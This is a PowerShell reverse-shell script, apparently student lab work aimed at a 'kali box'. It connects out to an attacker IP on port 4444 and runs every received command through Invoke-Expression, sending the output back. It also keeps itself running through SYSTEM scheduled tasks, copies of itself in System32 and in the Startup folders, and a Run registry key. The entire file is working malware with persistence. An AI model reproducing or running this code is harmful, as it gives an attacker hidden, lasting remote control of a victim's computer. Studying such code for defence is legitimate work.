#jimmy mcgovern
#reverse shell

#establishes connection to kali box
#.tcpClient takes string attackerip, portnumber
$client = New-Object System.Net.Sockets.TcpClient("192.168.192.32", 4444)
#gets the network stream in a readable/writeable form
$stream = $client.GetStream()
#sets up reader (reads data incoming from attacker)
$reader = New-Object System.IO.StreamReader($stream)
#sets up writer (sends data to attacker)
$writer = New-Object System.IO.StreamWriter($stream)
#all data is sent in real time
$writer.AutoFlush = $true
#sends the attacker a string formatted list of 
#all the commands the attacker can run    
$writer.WriteLine((Get-Command | Out-String))

#persistence
#$scriptPath = "C:\Users\student\Documents\reverseShell.ps1"
$scriptPath = $PSScriptRoot
$taskName = "windows_reverse_tool"

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $scriptPath"
$trigger = New-ScheduledTaskTrigger -AtStartup

$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteriesRunning $true -DontStopIfGoingOnBatteries $true -StartWhenAvailable $true
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Settings $settings -User "SYSTEM" -RunLevel Highest


#duplicate self to system32
Copy-Item -Path $scriptPath -Destination "C:\Windows\System32\reverseShell.ps1"
Copy-Item -Path $scriptPath -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1"
$userName = (Get-WmiObject -Class Win32_ComputerSystem).UserName
Copy-Item -Path $scriptPath -Destination "C:\Users\$userName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1"

#more persistence
New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\Windows\System32\reverseShell.ps1") -Trigger $trigger -TaskName "Windows_System32_bigdawg"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gawdDAMN" -Value "C:\Windows\System32\reverseShell.ps1"

#infinite loop
while ($true) { 
   $writer.Write("PS C:\> ")
#wait for a command from attacker
   $command = $reader.ReadLine()
   if ($command -eq "exit"){
        break #exit the loop if attacker sends exit
   }

   try{
        #Disable confirmation prompts
        $ConfirmPreference = 'None' 
        #execute command and send back the output
        #2>&1 sends both standard output and errors
        $output = Invoke-Expression $command 2>&1
        $outputString = $output | Out-String
        $writer.WriteLine($outputString)

        
   }catch{
        #if there is an error, send that
        $writer.WriteLine("Error: $_")
   }
}